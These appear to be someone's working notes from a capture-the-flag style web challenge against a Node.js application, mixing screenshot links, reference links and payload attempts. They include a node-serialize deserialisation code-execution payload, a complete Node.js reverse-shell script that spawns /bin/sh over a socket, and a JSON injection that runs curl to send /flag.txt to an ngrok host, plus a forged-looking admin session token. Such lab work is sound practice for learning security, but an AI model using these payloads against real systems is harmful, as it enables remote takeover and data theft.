mysql

![[Screenshot 2022-05-14 at 18.42.11.png]]
![[Screenshot 2022-05-14 at 19.31.15.png]]


https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf
https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work


![[Screenshot 2022-05-14 at 20.39.42.png]]
![[Screenshot 2022-05-14 at 20.40.23.png]]
![[Screenshot 2022-05-14 at 22.55.16.png]]
![[Screenshot 2022-05-14 at 23.00.40.png]]
![[Screenshot 2022-05-15 at 14.16.07.png]]

error message when login post request is dropped in burp:
![[Screenshot 2022-05-14 at 23.05.21.png]]


error message for potential vulnerability running it through burp:
![[Screenshot 2022-05-15 at 14.38.56.png]]
--> parsing error
![[Screenshot 2022-05-15 at 14.48.21.png]] !!
[this](https://book.hacktricks.xyz/pentesting-web/login-bypass) and [this](https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4) helped 

`Set-Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjUyNjIyNDkyfQ.GdVARMqKzcKJtI4-B2zIs0OKXCzlu3Vzw38xGFT-66Q`
![[Screenshot 2022-05-15 at 14.50.03.png]]

![[Screenshot 2022-05-15 at 14.52.00.png]]

feel it might have smtg to do with
`const changeMood = (mood) => {$('.spiky').removeClass('active');
$(`.${mood}`).addClass('active');`


Health + happiness only goes to 100, but weight could be set to 10003
Trying to set it to text:
![[Screenshot 2022-05-15 at 14.58.31.png]]
It is within `<span id="weight">`here`</span>`, 
`<script>` --> "missing parameters"
`alert('1')` --> something went wrong

![[Screenshot 2022-05-15 at 15.30.05.png]]

_deserialisation error_

`"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"`

**parseInt()** --> `return SpikyFactor.calculate(activity, parseInt(health), parseInt(weight), parseInt(happiness))
`

`SyntaxError: JSON.parse: unexpected character at line 1 column 1 of the JSON data` resulted in ![[Screenshot 2022-05-15 at 15.49.58.png]]



[useful?](https://infosecwriteups.com/celestial-a-node-js-deserialization-hackthebox-walk-through-c71a4da14eaa)
var net = require('net');
var spawn = require('child_process').spawn;
HOST="127.0.0.1";
PORT="1337";
TIMEOUT="5000";
if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var sh = spawn('/bin/sh',[]);
        client.write("Connected!\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit',function(code,signal){
          client.end("Disconnected!\n");
        });
    });
    client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
    });
}
c(HOST,PORT);



{
    "activity":"' == ''){global.process.mainModule.require('child_process').execSync('curl -d @/flag.txt http://4cb6-5-151-88-193.eu.ngrok.io').toString();//",
    "health":"60",
    "weight":"42",
    "happiness":"50"
}
![[Screenshot 2022-05-18 at 21.02.14.png]]


